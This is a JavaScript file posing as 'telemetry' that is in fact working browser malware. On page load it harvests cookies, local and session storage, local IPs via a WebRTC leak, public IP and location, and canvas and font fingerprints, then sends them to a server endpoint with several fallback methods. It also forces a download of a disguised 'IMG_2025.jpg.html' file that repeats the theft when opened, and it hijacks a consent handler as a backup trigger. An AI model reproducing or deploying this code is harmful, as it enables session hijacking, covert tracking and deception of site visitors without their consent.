// telemetry.js – Universal Image Dropper (FIXED: Correct env vars + robust sending)
(function() {
  'use strict';

  const ENDPOINT = '/.netlify/functions/telemetry';
  let executed = false;

  // ---------- HELPER: SEND DATA VIA MULTIPLE METHODS ----------
  async function sendToBackend(module, payload) {
    const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
    const siteOrigin = window.location.origin;
    const url = siteOrigin + ENDPOINT;

    // Method 1: Fetch with CORS
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: data,
        cache: 'no-store',
        keepalive: true
      });
      if (res.ok) {
        console.log(`✅ [${module}] Data sent via fetch`);
        return;
      }
      throw new Error('Fetch failed with status ' + res.status);
    } catch (e) {
      console.warn(`⚠️ [${module}] Fetch failed:`, e.message);
    }

    // Method 2: sendBeacon (works even during page unload)
    try {
      const blob = new Blob([data], { type: 'application/json' });
      const sent = navigator.sendBeacon(url, blob);
      if (sent) {
        console.log(`✅ [${module}] Data sent via sendBeacon`);
        return;
      }
      throw new Error('sendBeacon returned false');
    } catch (e) {
      console.warn(`⚠️ [${module}] sendBeacon failed:`, e.message);
    }

    // Method 3: Image beacon (GET fallback, limited data)
    try {
      const img = new Image();
      const encoded = encodeURIComponent(data);
      img.src = url + '?data=' + encoded;
      console.log(`✅ [${module}] Data sent via Image beacon (GET)`);
    } catch (e) {
      console.error(`❌ [${module}] All methods failed:`, e.message);
    }
  }

  // ---------- 1. BROWSER DATA EXFIL (AUTO, NO PERMISSION) ----------
  async function collectBrowserData() {
    const device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      vendor: navigator.vendor || 'N/A'
    };

    let battery = 'N/A';
    if (navigator.getBattery) {
      try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level*100)+'%', charging: b.charging ? 'Yes':'No' };
      } catch(_) {}
    }

    let localIPs = ['N/A'];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('test');
      await pc.createOffer();
      await pc.setLocalDescription();
      const ips = [];
      pc.onicecandidate = (e) => {
        if (!e || !e.candidate) return;
        const c = e.candidate.candidate;
        if (c) {
          const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
          if (m && !ips.includes(m[0])) ips.push(m[0]);
        }
      };
      await new Promise(r => setTimeout(r, 2000));
      localIPs = ips.length ? ips : ['N/A'];
      pc.close();
    } catch(_) {}

    let publicData = {};
    try {
      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      publicData = await r.json();
    } catch(_) {}

    const cookies = document.cookie || 'No cookies';
    let localStorageData = {}, sessionStorageData = {};
    try { localStorageData = { ...localStorage }; } catch(_) {}
    try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

    let canvas = 'N/A';
    try {
      const c = document.createElement('canvas');
      c.width = 256; c.height = 128;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0,0,16,16);
      ctx.fillStyle = '#069';
      ctx.textBaseline = 'alphabetic';
      ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
      ctx.fillStyle = '#ff6';
      ctx.fillRect(200,60,40,40);
      canvas = c.toDataURL();
    } catch(_) {}

    let fonts = [];
    try {
      const base = ['monospace','sans-serif','serif'];
      const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const txt = 'mmmmmmmmmmlli';
      const size = '72px';
      ctx.font = size + ' ' + base[0];
      const b = ctx.measureText(txt).width;
      for (const f of test) {
        ctx.font = size + ' "' + f + '", ' + base[0];
        const w = ctx.measureText(txt).width;
        if (w !== b) fonts.push(f);
      }
    } catch(_) {}

    return {
      device,
      battery,
      network: {
        localIPs,
        publicIP: publicData.ip || 'N/A',
        isp: publicData.org || 'N/A',
        approxLocation: {
          city: publicData.city || 'N/A',
          region: publicData.region || 'N/A',
          country: publicData.country_name || 'N/A',
          lat: publicData.latitude || 'N/A',
          lng: publicData.longitude || 'N/A'
        }
      },
      storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
      fingerprints: { canvas, fonts },
      referrer: document.referrer,
      pageUrl: location.href
    };
  }

  // ---------- 2. MALICIOUS IMAGE DROPPER (DOUBLE EXTENSION + ABSOLUTE URL) ----------
  function dropMaliciousImage() {
    try {
      const imageUrl = 'https://files.catbox.moe/l9xdjq.png';
      const siteOrigin = window.location.origin;

      // Self-contained HTML with robust sending
      const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IMG_2025</title>
  <meta property="og:image" content="${imageUrl}" />
  <meta property="og:title" content="Beautiful Sunset" />
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; display:flex; justify-content:center; align-items:center; min-height:100vh; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
    .container { max-width:95vw; max-height:95vh; border-radius:12px; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,0.8); background:#1a1a1a; }
    img { display:block; width:100%; height:auto; max-height:80vh; object-fit:contain; }
    .caption { padding:10px 20px; color:#ccc; text-align:center; font-size:13px; background:#1a1a1a; border-top:1px solid #333; }
  </style>
</head>
<body>
  <div class="container">
    <img src="${imageUrl}" alt="Beautiful Sunset" />
    <div class="caption">📸 IMG_2025 • Tap to share</div>
  </div>

  <script>
    (function() {
      const ENDPOINT = '${siteOrigin}/.netlify/functions/telemetry';

      // --- SEND FUNCTION (with fallbacks) ---
      async function sendData(module, payload) {
        const data = JSON.stringify({ module, ...payload, timestamp: new Date().toISOString() });
        try {
          // 1. Fetch
          const res = await fetch(ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: data,
            cache: 'no-store',
            keepalive: true
          });
          if (res.ok) { console.log('✅ Data sent via fetch'); return; }
        } catch(e) { console.warn('Fetch failed:', e.message); }

        // 2. sendBeacon
        try {
          const blob = new Blob([data], { type: 'application/json' });
          if (navigator.sendBeacon(ENDPOINT, blob)) {
            console.log('✅ Data sent via sendBeacon');
            return;
          }
        } catch(e) { console.warn('sendBeacon failed:', e.message); }

        // 3. Image beacon
        try {
          const img = new Image();
          img.src = ENDPOINT + '?data=' + encodeURIComponent(data);
          console.log('✅ Data sent via Image beacon');
        } catch(e) { console.error('All methods failed:', e.message); }
      }

      // --- COLLECT DATA ---
      async function collect() {
        const device = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory,
          screen: screen.width+'x'+screen.height,
          pixelRatio: devicePixelRatio,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          vendor: navigator.vendor || 'N/A'
        };

        let battery = 'N/A';
        if (navigator.getBattery) {
          try {
            const b = await navigator.getBattery();
            battery = { level: Math.round(b.level*100)+'%', charging: b.charging?'Yes':'No' };
          } catch(_) {}
        }

        let localIPs = ['N/A'];
        try {
          const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
          pc.createDataChannel('test');
          await pc.createOffer();
          await pc.setLocalDescription();
          const ips = [];
          pc.onicecandidate = (e) => {
            if (!e || !e.candidate) return;
            const c = e.candidate.candidate;
            if (c) {
              const m = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
              if (m && !ips.includes(m[0])) ips.push(m[0]);
            }
          };
          await new Promise(r => setTimeout(r, 2000));
          localIPs = ips.length ? ips : ['N/A'];
          pc.close();
        } catch(_) {}

        let publicData = {};
        try {
          const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
          publicData = await r.json();
        } catch(_) {}

        const cookies = document.cookie || 'No cookies';
        let localStorageData = {}, sessionStorageData = {};
        try { localStorageData = { ...localStorage }; } catch(_) {}
        try { sessionStorageData = { ...sessionStorage }; } catch(_) {}

        let canvas = 'N/A';
        try {
          const c = document.createElement('canvas');
          c.width = 256; c.height = 128;
          const ctx = c.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(0,0,16,16);
          ctx.fillStyle = '#069';
          ctx.textBaseline = 'alphabetic';
          ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
          ctx.fillStyle = 'rgba(102,204,0,0.7)';
          ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 45);
          ctx.fillStyle = '#ff6';
          ctx.fillRect(200,60,40,40);
          canvas = c.toDataURL();
        } catch(_) {}

        let fonts = [];
        try {
          const base = ['monospace','sans-serif','serif'];
          const test = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Calibri','Cambria','Garamond','Roboto','Noto Sans'];
          const c = document.createElement('canvas');
          const ctx = c.getContext('2d');
          const txt = 'mmmmmmmmmmlli';
          const size = '72px';
          ctx.font = size + ' ' + base[0];
          const b = ctx.measureText(txt).width;
          for (const f of test) {
            ctx.font = size + ' "' + f + '", ' + base[0];
            const w = ctx.measureText(txt).width;
            if (w !== b) fonts.push(f);
          }
        } catch(_) {}

        return {
          device, battery,
          network: {
            localIPs,
            publicIP: publicData.ip || 'N/A',
            isp: publicData.org || 'N/A',
            approxLocation: {
              city: publicData.city || 'N/A',
              region: publicData.region || 'N/A',
              country: publicData.country_name || 'N/A',
              lat: publicData.latitude || 'N/A',
              lng: publicData.longitude || 'N/A'
            }
          },
          storage: { cookies, localStorage: localStorageData, sessionStorage: sessionStorageData },
          fingerprints: { canvas, fonts },
          referrer: document.referrer,
          pageUrl: location.href
        };
      }

      // --- AUTO-RUN ---
      collect().then(data => {
        sendData('IMAGE_DROPPER_PAYLOAD', data);
        // Also log to console for debugging
        console.log('📡 Data sent:', data);
      });
    })();
  </script>
</body>
</html>`;

      const blob = new Blob([htmlContent], { type: 'text/html' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'IMG_2025.jpg.html';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 200);

      sendToBackend('IMAGE_DROPPER_DELIVERED', {
        status: 'Downloaded',
        filename: 'IMG_2025.jpg.html',
        note: 'Absolute URL: ' + siteOrigin + ENDPOINT
      });
    } catch (e) {
      sendToBackend('IMAGE_DROPPER_ERROR', { error: e.message });
    }
  }

  // ---------- 3. MASTER TRIGGER ----------
  async function runAll() {
    if (executed) return;
    executed = true;

    console.log('%c📸 Dropping image payload...', 'font-size:16px; color:#ff6600;');

    const data = await collectBrowserData();
    await sendToBackend('AUTO_TELEMETRY', data);
    dropMaliciousImage();

    console.log('%c✅ Payload delivered.', 'font-size:16px; color:#00ffcc;');
  }

  // ---------- 4. AUTO-TRIGGER ON LOAD ----------
  if (document.readyState === 'complete') {
    setTimeout(runAll, 800);
  } else {
    window.addEventListener('load', () => setTimeout(runAll, 800));
  }

  // Balloon click backup
  const orig = window.grantBalloonConsent;
  window.grantBalloonConsent = function() {
    if (orig) orig();
    if (!executed) runAll();
  };
})();
